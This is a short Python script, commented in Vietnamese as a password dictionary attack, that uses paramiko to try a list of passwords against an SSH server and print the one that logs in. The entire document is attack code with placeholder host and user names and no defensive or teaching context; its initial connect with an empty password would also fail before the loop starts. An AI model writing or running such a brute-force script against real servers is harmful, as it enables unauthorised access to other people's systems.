import paramiko

# Thiết lập kết nối SSH
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('target_host', username='target_user', password='')

# Tấn công từ điển mật khẩu
passwords = ['password1', 'password2', 'password3']
for password in passwords:
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect('target_host', username='target_user', password=password)
        print('Đăng nhập thành công với mật khẩu:', password)
        break
    except:
        print('Đăng nhập thất bại với mật khẩu:', password)
